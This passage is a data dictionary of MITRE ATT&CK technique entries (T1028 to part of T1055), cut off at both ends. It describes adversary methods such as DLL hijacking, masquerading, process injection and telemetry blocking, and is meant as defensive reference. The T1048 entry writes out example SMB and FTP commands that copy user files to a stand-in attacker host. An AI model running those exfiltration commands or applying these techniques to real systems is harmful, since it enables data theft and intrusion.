                          'McAfee Malicious Doc Targets Pyeongchang Olympics)',
           'name': 'Obfuscated Files or Information',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1028': {'attack_id': 'T1028',
           'categories': ['execution', 'lateral-movement'],
           'description': 'Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that '
                          'allows a user to interact with a remote system (e.g., run an executable, modify the '
                          'Registry, modify services). (Citation: Microsoft WinRM) It may be called with the '
                          '<code>winrm</code> command or by any number of programs such as PowerShell. (Citation: '
                          'Jacobsen 2014)',
           'name': 'Windows Remote Management',
           'platforms': ['Windows']},
 'T1029': {'attack_id': 'T1029',
           'categories': ['exfiltration'],
           'description': 'Data exfiltration may be performed only at certain times of day or at certain intervals. '
                          'This could be done to blend traffic patterns with normal activity or availability.\n'
                          '\n'
                          'When scheduled exfiltration is used, other exfiltration techniques likely apply as well to '
                          'transfer the information out of the network, such as Exfiltration Over Command and Control '
                          'Channel and Exfiltration Over Alternative Protocol.',
           'name': 'Scheduled Transfer',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1030': {'attack_id': 'T1030',
           'categories': ['exfiltration'],
           'description': 'An adversary may exfiltrate data in fixed size chunks instead of whole files or limit '
                          'packet sizes below certain thresholds. This approach may be used to avoid triggering '
                          'network data transfer threshold alerts.',
           'name': 'Data Transfer Size Limits',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1031': {'attack_id': 'T1031',
           'categories': ['persistence'],
           'description': "Windows service configuration information, including the file path to the service's "
                          'executable or recovery programs/commands, is stored in the Registry. Service configurations '
                          'can be modified using utilities such as sc.exe and '
                          '[Reg](https://attack.mitre.org/software/S0075).\n'
                          '\n'
                          'Adversaries can modify an existing service to persist malware on a system by using system '
                          'utilities or by using custom tools to interact with the Windows API. Use of existing '
                          'services is a type of [Masquerading](https://attack.mitre.org/techniques/T1036) that may '
                          'make detection analysis more challenging. Modifying existing services may interrupt their '
                          'functionality or may enable services that are disabled or otherwise not commonly used.\n'
                          '\n'
                          'Adversaries may also intentionally corrupt or kill services to execute malicious recovery '
                          'programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft '
                          'Service Recovery Feb 2013)',
           'name': 'Modify Existing Service',
           'platforms': ['Windows']},
 'T1032': {'attack_id': 'T1032',
           'categories': ['command-and-control'],
           'description': 'Adversaries may explicitly employ a known encryption algorithm to conceal command and '
                          'control traffic rather than relying on any inherent protections provided by a communication '
                          'protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to '
                          'reverse engineering if necessary secret keys are encoded and/or generated within malware '
                          'samples/configuration files.',
           'name': 'Standard Cryptographic Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1033': {'attack_id': 'T1033',
           'categories': ['discovery'],
           'description': '### Windows\n'
                          '\n'
                          'Adversaries may attempt to identify the primary user, currently logged in user, set of '
                          'users that commonly uses a system, or whether a user is actively using the system. They may '
                          'do this, for example, by retrieving account usernames or by using [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a '
                          'number of different ways using other Discovery techniques, because user and username '
                          'details are prevalent throughout a system and include running process ownership, '
                          'file/directory ownership, session information, and system logs. Adversaries may use the '
                          'information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) '
                          'during automated discovery to shape follow-on behaviors, including whether or not the '
                          'adversary fully infects the target and/or attempts specific actions.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, the currently logged in user can be identified with '
                          '<code>users</code>,<code>w</code>, and <code>who</code>.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'On Linux, the currently logged in user can be identified with <code>w</code> and '
                          '<code>who</code>.',
           'name': 'System Owner/User Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1034': {'attack_id': 'T1034',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Path interception occurs when an executable is placed in a specific path so that it is '
                          'executed by an application instead of the intended target. One example of this was the use '
                          'of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working '
                          'directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess '
                          'function. (Citation: TechNet MS14-019)\n'
                          '\n'
                          'There are multiple distinct weaknesses or misconfigurations that adversaries may take '
                          'advantage of when performing path interception: unquoted paths, path environment variable '
                          'misconfigurations, and search order hijacking. The first vulnerability deals with full '
                          'program paths, while the second and third occur when program paths are not specified. These '
                          'techniques can be used for persistence if executables are called on a regular basis, as '
                          'well as privilege escalation if intercepted executables are started by a higher privileged '
                          'process.\n'
                          '\n'
                          '### Unquoted Paths\n'
                          'Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut '
                          'paths are vulnerable to path interception if the path has one or more spaces and is not '
                          'surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> '
                          'vs. <code>"C:\\safe path with space\\program.exe"</code>). (Citation: Baggett 2012) An '
                          'adversary can place an executable in a higher level directory of the path, and Windows will '
                          'resolve that executable instead of the intended executable. For example, if the path in a '
                          'shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at '
                          '<code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: '
                          'SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan '
                          '2018)\n'
                          '\n'
                          '### PATH Environment Variable Misconfiguration\n'
                          'The PATH environment variable contains a list of directories. Certain methods of executing '
                          'a program (namely using cmd.exe or the command-line) rely solely on the PATH environment '
                          'variable to determine the locations that are searched for a program when the path for the '
                          'program is not given. If any directories are listed in the PATH environment variable before '
                          'the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., '
                          '<code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory '
                          'that is named the same as a Windows program (such as cmd, PowerShell, or Python), which '
                          'will be executed when that command is executed from a script or command-line.\n'
                          '\n'
                          'For example, if <code>C:\\example path</code> precedes <code>C:\\Windows\\system32</code> '
                          'is in the PATH environment variable, a program that is named net.exe and placed in '
                          '<code>C:\\example path</code> will be called instead of the Windows system "net" when "net" '
                          'is executed from the command-line.\n'
                          '\n'
                          '### Search Order Hijacking\n'
                          'Search order hijacking occurs when an adversary abuses the order in which Windows searches '
                          'for programs that are not given a path. The search order differs depending on the method '
                          'that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT '
                          'Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the '
                          'directory of the initiating program before searching through the Windows system directory. '
                          'An adversary who finds a program vulnerable to search order hijacking (i.e., a program that '
                          'does not specify the path to an executable) may take advantage of this vulnerability by '
                          'creating a program named after the improperly specified program and placing it within the '
                          "initiating program's directory.\n"
                          '\n'
                          'For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net '
                          'user</code>. An adversary may place a program called "net.exe" within the same directory as '
                          'example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, '
                          'if an adversary places a program called "net.com" in the same directory as "net.exe", then '
                          '<code>cmd.exe /C net user</code> will execute "net.com" instead of "net.exe" due to the '
                          'order of executable extensions defined under PATHEXT. (Citation: MSDN Environment '
                          'Property)\n'
                          '\n'
                          'Search order hijacking is also a common practice for hijacking DLL loads and is covered in '
                          '[DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).',
           'name': 'Path Interception',
           'platforms': ['Windows']},
 'T1035': {'attack_id': 'T1035',
           'categories': ['execution'],
           'description': 'Adversaries may execute a binary, command, or script via a method that interacts with '
                          'Windows services, such as the Service Control Manager. This can be done by either creating '
                          'a new service or modifying an existing service. This technique is the execution used in '
                          'conjunction with [New Service](https://attack.mitre.org/techniques/T1050) and [Modify '
                          'Existing Service](https://attack.mitre.org/techniques/T1031) during service persistence or '
                          'privilege escalation.',
           'name': 'Service Execution',
           'platforms': ['Windows']},
 'T1036': {'attack_id': 'T1036',
           'categories': ['defense-evasion'],
           'description': 'Masquerading occurs when the name or location of an executable, legitimate or malicious, is '
                          'manipulated or abused for the sake of evading defenses and observation. Several different '
                          'variations of this technique have been observed.\n'
                          '\n'
                          'One variant is for an executable to be placed in a commonly trusted directory or given the '
                          'name of a legitimate, trusted program. Alternatively, the filename given may be a close '
                          'approximation of legitimate programs or something innocuous. An example of this is when a '
                          'common system utility or program is moved and renamed to avoid detection based on its '
                          'usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust '
                          'executables by relying on file name or path, as well as to deceive defenders and system '
                          'administrators into thinking a file is benign by associating the name with something that '
                          'is thought to be legitimate.\n'
                          '\n'
                          'A third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means '
                          'of tricking a user into executing what they think is a benign file type but is actually '
                          'executable code. RTLO is a non-printing character that causes the text that follows it to '
                          'be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows '
                          'screensaver file named\xa0<code>March 25 \\u202Excod.scr</code> will display as <code>March '
                          '25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be '
                          'displayed as <code>photo_high_resj.png</code>. A common use of this technique is with '
                          'spearphishing attachments since it can trick both end users and defenders if they are not '
                          'aware of how their tools display and render the RTLO character. Use of the RTLO character '
                          'has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend '
                          'Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows '
                          'Registry as well, where regedit.exe displays the reversed characters but the command line '
                          'tool reg.exe does not by default.\xa0\n'
                          '\n'
                          "Adversaries may modify a binary's metadata, including such fields as icons, version, name "
                          'of the product, description, and copyright, to better blend in with the environment and '
                          'increase chances of deceiving a security analyst or product.(Citation: Threatexpress '
                          'MetaTwin 2017)\n'
                          '\n'
                          '### Windows\n'
                          'In another variation of this technique, an adversary may use a renamed copy of a legitimate '
                          'utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case '
                          'occurs when a legitimate utility is moved to a different directory and also renamed to '
                          'avoid detections based on system utilities executing from non-standard paths. (Citation: '
                          'F-Secure CozyDuke)\n'
                          '\n'
                          'An example of abuse of trusted locations in Windows would be the '
                          '<code>C:\\Windows\\System32</code> directory. Examples of trusted binary names that can be '
                          'given to malicious binares include "explorer.exe" and "svchost.exe".\n'
                          '\n'
                          '### Linux\n'
                          'Another variation of this technique includes malicious binaries changing the name of their '
                          'running process to that of a trusted or benign process, after they have been launched as '
                          'opposed to before. (Citation: Remaiten)\n'
                          '\n'
                          'An example of abuse of trusted locations in Linux  would be the <code>/bin</code> '
                          'directory. Examples of trusted binary names that can be given to malicious binaries include '
                          '"rsyncd" and "dbus-inotifier". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr '
                          'Web Analysis)',
           'name': 'Masquerading',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1037': {'attack_id': 'T1037',
           'categories': ['lateral-movement', 'persistence'],
           'description': '### Windows\n'
                          '\n'
                          'Windows allows logon scripts to be run whenever a specific user or group of users log into '
                          'a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform '
                          'administrative functions, which may often execute other programs or send information to an '
                          'internal logging server.\n'
                          '\n'
                          'If adversaries can access these scripts, they may insert additional code into the logon '
                          'script to execute their tools when a user logs in. This code can allow them to maintain '
                          'persistence on a single system, if it is a local script, or to move laterally within a '
                          'network, if the script is stored on a central server and pushed to many systems. Depending '
                          'on the access configuration of the logon scripts, either local credentials or an '
                          'administrator account may be necessary.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'Mac allows login and logoff hooks to be run as root whenever a specific user logs into or '
                          'out of a system. A login hook tells Mac OS X to execute a certain script when a user logs '
                          'in, but unlike startup items, a login hook executes as root (Citation: creating login '
                          'hook). There can only be one login hook at a time though. If adversaries can access these '
                          'scripts, they can insert additional code to the script to execute their tools when a user '
                          'logs in.',
           'name': 'Logon Scripts',
           'platforms': ['macOS', 'Windows']},
 'T1038': {'attack_id': 'T1038',
           'categories': ['persistence', 'privilege-escalation', 'defense-evasion'],
           'description': 'Windows systems use a common method to look for required DLLs to load into a program. '
                          '(Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search '
                          'order and programs that ambiguously specify DLLs to gain privilege escalation and '
                          'persistence. \n'
                          '\n'
                          'Adversaries may perform DLL preloading, also called binary planting attacks, (Citation: '
                          'OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously '
                          'specified DLL in a location that Windows searches before the legitimate DLL. Often this '
                          'location is the current working directory of the program. Remote DLL preloading attacks '
                          'occur when a program sets its current directory to a remote location such as a Web share '
                          'before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to '
                          'cause the program to load a malicious DLL. \n'
                          '\n'
                          'Adversaries may also directly modify the way a program loads DLLs by replacing an existing '
                          'DLL or modifying a .manifest or .local redirection file, directory, or junction to cause '
                          'the program to load a different DLL to maintain persistence or privilege escalation. '
                          '(Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant '
                          'Search Order)\n'
                          '\n'
                          'If a search order-vulnerable program is configured to run at a higher privilege level, then '
                          'the adversary-controlled DLL that is loaded will also be executed at the higher level. In '
                          'this case, the technique could be used for privilege escalation from user to administrator '
                          'or SYSTEM or from administrator to SYSTEM, depending on the program.\n'
                          '\n'
                          'Programs that fall victim to path hijacking may appear to behave normally because malicious '
                          'DLLs may be configured to also load the legitimate DLLs they were meant to replace.',
           'name': 'DLL Search Order Hijacking',
           'platforms': ['Windows']},
 'T1039': {'attack_id': 'T1039',
           'categories': ['collection'],
           'description': 'Sensitive data can be collected from remote systems via shared network drives (host shared '
                          'directory, network file server, etc.) that are accessible from the current system prior to '
                          'Exfiltration.\n'
                          '\n'
                          'Adversaries may search network shares on computers they have compromised to find files of '
                          'interest. Interactive command shells may be in use, and common functionality within '
                          '[cmd](https://attack.mitre.org/software/S0106) may be used to gather information.',
           'name': 'Data from Network Shared Drive',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1040': {'attack_id': 'T1040',
           'categories': ['credential-access', 'discovery'],
           'description': 'Network sniffing refers to using the network interface on a system to monitor or capture '
                          'information sent over a wired or wireless connection. An adversary may place a network '
                          'interface into promiscuous mode to passively access data in transit over the network, or '
                          'use span ports to capture a larger amount of data.\n'
                          '\n'
                          'Data captured via this technique may include user credentials, especially those sent over '
                          'an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such '
                          'as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also '
                          'be used to capture credentials to websites, proxies, and internal systems by redirecting '
                          'traffic to an adversary.\n'
                          '\n'
                          'Network sniffing may also reveal configuration details, such as running services, version '
                          'numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) '
                          'necessary for follow-on Lateral Movement and/or Defense Evasion activities.',
           'name': 'Network Sniffing',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1041': {'attack_id': 'T1041',
           'categories': ['exfiltration'],
           'description': 'Data exfiltration is performed over the Command and Control channel. Data is encoded into '
                          'the normal communications channel using the same protocol as command and control '
                          'communications.',
           'name': 'Exfiltration Over Command and Control Channel',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1042': {'attack_id': 'T1042',
           'categories': ['persistence'],
           'description': 'When a file is opened, the default program used to open the file (also called the file '
                          'association or handler) is checked. File association selections are stored in the Windows '
                          'Registry and can be edited by users, administrators, or programs that have Registry access '
                          '(Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by '
                          'administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) '
                          'Applications can modify the file association for a given file extension to call an '
                          'arbitrary program when a file with the given extension is opened.\n'
                          '\n'
                          'System file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for '
                          'example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that '
                          'extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are '
                          'then listed as subkeys underneath the shell key at '
                          '<code>HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command</code>. For example:\n'
                          '* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n'
                          '* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n'
                          '* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n'
                          '\n'
                          'The values of the keys listed are commands that are executed when the handler opens the '
                          'file extension. Adversaries can modify these values to continually execute arbitrary '
                          'commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)',
           'name': 'Change Default File Association',
           'platforms': ['Windows']},
 'T1043': {'attack_id': 'T1043',
           'categories': ['command-and-control'],
           'description': 'Adversaries may communicate over a commonly used port to bypass firewalls or network '
                          'detection systems and to blend with normal network activity to avoid more detailed '
                          'inspection. They may use commonly open ports such as\n'
                          '\n'
                          '* TCP:80 (HTTP)\n'
                          '* TCP:443 (HTTPS)\n'
                          '* TCP:25 (SMTP)\n'
                          '* TCP/UDP:53 (DNS)\n'
                          '\n'
                          'They may use the protocol associated with the port or a completely different protocol. \n'
                          '\n'
                          'For connections that occur internally within an enclave (such as those between a proxy or '
                          'pivot node and other nodes), examples of common ports are \n'
                          '\n'
                          '* TCP/UDP:135 (RPC)\n'
                          '* TCP/UDP:22 (SSH)\n'
                          '* TCP/UDP:3389 (RDP)',
           'name': 'Commonly Used Port',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1044': {'attack_id': 'T1044',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Processes may automatically execute specific binaries as part of their functionality or to '
                          'perform other actions. If the permissions on the file system directory containing a target '
                          'binary, or permissions on the binary itself, are improperly set, then the target binary may '
                          'be overwritten with another binary using user-level permissions and executed by the '
                          'original process. If the original process and thread are running under a higher permissions '
                          'level, then the replaced binary will also execute under higher-level permissions, which '
                          'could include SYSTEM.\n'
                          '\n'
                          'Adversaries may use this technique to replace legitimate binaries with malicious ones as a '
                          'means of executing code at a higher permissions level. If the executing process is set to '
                          'run at a specific time or during a certain event (e.g., system bootup) then this technique '
                          'can also be used for persistence.\n'
                          '\n'
                          '### Services\n'
                          '\n'
                          'Manipulation of Windows service binaries is one variation of this technique. Adversaries '
                          'may replace a legitimate service executable with their own executable to gain persistence '
                          'and/or privilege escalation to the account context the service is set to execute under '
                          '(local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is '
                          'started, either directly by the user (if appropriate access is available) or through some '
                          'other means, such as a system restart if the service starts on bootup, the replaced '
                          'executable will run instead of the original service executable.\n'
                          '\n'
                          '### Executable Installers\n'
                          '\n'
                          'Another variation of this technique can be performed by taking advantage of a weakness that '
                          'is common in executable, self-extracting installers. During the installation process, it is '
                          'common for installers to use a subdirectory within the <code>%TEMP%</code> directory to '
                          'unpack binaries such as DLLs, EXEs, or other payloads. When installers create '
                          'subdirectories and files they often do not set appropriate permissions to restrict write '
                          'access, which allows for execution of untrusted code placed in the subdirectories or '
                          'overwriting of binaries used in the installation process. This behavior is related to and '
                          'may take advantage of [DLL Search Order '
                          'Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require '
                          'elevated privileges that will result in privilege escalation when executing adversary '
                          'controlled code. This behavior is related to [Bypass User Account '
                          'Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in '
                          'existing common installers have been reported to software vendors. (Citation: Mozilla '
                          'Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)',
           'name': 'File System Permissions Weakness',
           'platforms': ['Windows']},
 'T1045': {'attack_id': 'T1045',
           'categories': ['defense-evasion'],
           'description': 'Software packing is a method of compressing or encrypting an executable. Packing an '
                          'executable changes the file signature in an attempt to avoid signature-based detection. '
                          'Most decompression techniques decompress the executable code in memory.\n'
                          '\n'
                          'Utilities used to perform software packing are called packers. Example packers are MPRESS '
                          'and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe '
                          'Compression) but adversaries may create their own packing techniques that do not leave the '
                          'same artifacts as well-known packers to evade defenses.\n'
                          '\n'
                          'Adversaries may use virtual machine software protection as a form of software packing to '
                          "protect their code. Virtual machine software protection translates an executable's original "
                          'code into a special format that only a special virtual machine can run. A virtual machine '
                          'is then called to run this code.(Citation: ESET FinFisher Jan 2018)',
           'name': 'Software Packing',
           'platforms': ['Windows', 'macOS']},
 'T1046': {'attack_id': 'T1046',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of services running on remote hosts, including '
                          'those that may be vulnerable to remote software exploitation. Methods to acquire this '
                          'information include port scans and vulnerability scans using tools that are brought onto a '
                          'system. \n'
                          '\n'
                          'Within cloud environments, adversaries may attempt to discover services running on other '
                          'cloud hosts or cloud services enabled within the environment. Additionally, if the cloud '
                          'environment is connected to a on-premises environment, adversaries may be able to identify '
                          'services running on non-cloud systems.',
           'name': 'Network Service Scanning',
           'platforms': ['Linux', 'Windows', 'macOS', 'AWS', 'GCP', 'Azure']},
 'T1047': {'attack_id': 'T1047',
           'categories': ['execution'],
           'description': 'Windows Management Instrumentation (WMI) is a Windows administration feature that provides '
                          'a uniform environment for local and remote access to Windows system components. It relies '
                          'on the WMI service for local and remote access and the server message block (SMB) '
                          '(Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) '
                          'for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\n'
                          '\n'
                          'An adversary can use WMI to interact with local and remote systems and use it as a means to '
                          'perform many tactic functions, such as gathering information for Discovery and remote '
                          'Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)',
           'name': 'Windows Management Instrumentation',
           'platforms': ['Windows']},
 'T1048': {'attack_id': 'T1048',
           'categories': ['exfiltration'],
           'description': 'Data exfiltration is performed with a different protocol from the main command and control '
                          'protocol or channel. The data is likely to be sent to an alternate network location from '
                          'the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, '
                          'SMB, or any other network protocol not being used as the main command and control channel. '
                          'Different channels could include Internet Web services such as cloud storage.\n'
                          '\n'
                          'Adversaries may leverage various operating system utilities to exfiltrate data over an '
                          'alternative protocol. \n'
                          '\n'
                          'SMB command-line example:\n'
                          '\n'
                          '* <code>net use \\\\\\attacker_system\\IPC$ /user:username password && xcopy /S /H /C /Y '
                          'C:\\Users\\\\* \\\\\\attacker_system\\share_folder\\</code>\n'
                          '\n'
                          'Anonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)\n'
                          '\n'
                          '* <code>echo PUT C:\\Path\\to\\file.txt | ftp -A attacker_system</code>\n',
           'name': 'Exfiltration Over Alternative Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1049': {'attack_id': 'T1049',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of network connections to or from the compromised '
                          'system they are currently accessing or from remote systems by querying for information over '
                          'the network. \n'
                          '\n'
                          'An adversary who gains access to a system that is part of a cloud-based environment may map '
                          'out Virtual Private Clouds or Virtual Networks in order to determine what systems and '
                          'services are connected. The actions performed are likely the same types of discovery '
                          'techniques depending on the operating system, but the resulting information may include '
                          "details about the networked cloud environment relevant to the adversary's goals. Cloud "
                          'providers may have different ways in which their virtual networks operate.(Citation: Amazon '
                          'AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC '
                          'Overview)\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Utilities and commands that acquire this information include '
                          '[netstat](https://attack.mitre.org/software/S0104), "net use," and "net session" with '
                          '[Net](https://attack.mitre.org/software/S0039).\n'
                          '\n'
                          '### Mac and Linux \n'
                          '\n'
                          'In Mac and Linux, <code>netstat</code> and <code>lsof</code> can be used to list current '
                          'connections. <code>who -a</code> and <code>w</code> can be used to show which users are '
                          'currently logged in, similar to "net session".',
           'name': 'System Network Connections Discovery',
           'platforms': ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure']},
 'T1050': {'attack_id': 'T1050',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'When operating systems boot up, they can start programs or applications called services '
                          "that perform background system functions. (Citation: TechNet Services) A service's "
                          "configuration information, including the file path to the service's executable, is stored "
                          'in the Windows Registry. \n'
                          '\n'
                          'Adversaries may install a new service that can be configured to execute at startup by using '
                          'utilities to interact with services or by directly modifying the Registry. The service name '
                          'may be disguised by using a name from a related operating system or benign software with '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036). Services may be created with '
                          'administrator privileges but are executed under SYSTEM privileges, so an adversary may also '
                          'use a service to escalate privileges from administrator to SYSTEM. Adversaries may also '
                          'directly start services through [Service '
                          'Execution](https://attack.mitre.org/techniques/T1035).',
           'name': 'New Service',
           'platforms': ['Windows']},
 'T1051': {'attack_id': 'T1051',
           'categories': ['lateral-movement'],
           'description': 'Adversaries may add malicious content to an internally accessible website through an open '
                          "network file share that contains the website's webroot or Web content directory (Citation: "
                          'Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content '
                          'with a Web browser to cause the server to execute the malicious content. The malicious '
                          'content will typically run under the context and permissions of the Web server process, '
                          'often resulting in local system or administrative privileges, depending on how the Web '
                          'server is configured.\n'
                          '\n'
                          'This mechanism of shared access and remote execution could be used for lateral movement to '
                          'the system running the Web server. For example, a Web server running PHP with an open '
                          'network share could allow an adversary to upload a remote access tool and PHP script to '
                          'execute the RAT on the system running the Web server when a specific page is visited. '
                          '(Citation: Webroot PHP 2011)',
           'name': 'Shared Webroot',
           'platforms': ['Windows']},
 'T1052': {'attack_id': 'T1052',
           'categories': ['exfiltration'],
           'description': 'In certain circumstances, such as an air-gapped network compromise, exfiltration could '
                          'occur via a physical medium or device introduced by a user. Such media could be an external '
                          'hard drive, USB drive, cellular phone, MP3 player, or other removable storage and '
                          'processing device. The physical medium or device could be used as the final exfiltration '
                          'point or to hop between otherwise disconnected systems.',
           'name': 'Exfiltration Over Physical Medium',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1053': {'attack_id': 'T1053',
           'categories': ['execution', 'persistence', 'privilege-escalation'],
           'description': 'Utilities such as [at](https://attack.mitre.org/software/S0110) and '
                          '[schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, '
                          'can be used to schedule programs or scripts to be executed at a date and time. A task can '
                          'also be scheduled on a remote system, provided the proper authentication is met to use RPC '
                          'and file and printer sharing is turned on. Scheduling a task on a remote system typically '
                          'required being a member of the Administrators group on the remote system. (Citation: '
                          'TechNet Task Scheduler Security)\n'
                          '\n'
                          'An adversary may use task scheduling to execute programs at system startup or on a '
                          'scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, '
                          'to gain SYSTEM privileges, or to run a process under the context of a specified account.',
           'name': 'Scheduled Task',
           'platforms': ['Windows']},
 'T1054': {'attack_id': 'T1054',
           'categories': ['defense-evasion'],
           'description': 'An adversary may attempt to block indicators or events typically captured by sensors from '
                          'being gathered and analyzed. This could include maliciously redirecting (Citation: '
                          'Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for '
                          'Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that '
                          'control the collection and flow of event telemetry. (Citation: Medium Event Tracing '
                          'Tampering 2018) These settings may be stored on the system in configuration files and/or in '
                          'the Registry as well as being accessible via administrative utilities such as '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management '
                          'Instrumentation](https://attack.mitre.org/techniques/T1047).\n'
                          '\n'
                          'ETW interruption can be achieved multiple ways, however most directly by defining '
                          'conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with '
                          'the registry to make alterations.\n'
                          '\n'
                          'In the case of network-based reporting of indicators, an adversary may block traffic '
                          'associated with reporting to prevent central analysis. This may be accomplished by many '
                          'means, such as stopping a local process responsible for forwarding telemetry and/or '
                          'creating a host-based firewall rule to block traffic to specific hosts responsible for '
                          'aggregating events, such as security information and event management (SIEM) products. ',
           'name': 'Indicator Blocking',
           'platforms': ['Windows']},
 'T1055': {'attack_id': 'T1055',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Process injection is a method of executing arbitrary code in the address space of a '
                          'separate live process. Running code in the context of another process may allow access to '
                          "the process's memory, system/network resources, and possibly elevated privileges. Execution "
                          'via process injection may also evade detection from security products since the execution '
                          'is masked under a legitimate process.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'There are multiple approaches to injecting code into a live process. Windows '
                          'implementations include: (Citation: Endgame Process Injection July 2017)\n'
                          '\n'
                          '* **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL '
                          'inside a process then invoking execution by creating a remote thread.\n'
                          '* **Portable executable injection** involves writing malicious code directly into the '
                          'process (without a file on disk) then invoking execution with either additional code or by '
                          'creating a remote thread. The displacement of the injected code introduces the additional '
                          'requirement for functionality to remap memory references. Variations of this method such as '
                          'reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map '
                          'DLL when writing into process) overcome the address relocation issue. (Citation: Endgame '
                          'HuntingNMemory June 2017)\n'
                          '* **Thread execution hijacking** involves injecting malicious code or the path to a DLL '
                          'into a thread of a process. Similar to [Process '
                          'Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.\n'
                          '* **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the '
                          "APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are "
                          'executed when the thread enters an alterable state. A variation of APC injection, dubbed '
                          '"Early Bird injection", involves creating a suspended process in which malicious code can '
                          "be written and executed before the process' entry point (and potentially subsequent "
                          'anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  '
                          '(Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke '
                          'malicious code previously written to the global atom table. (Citation: Microsoft Atom '
                          'Table)\n'
                          '* **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a '
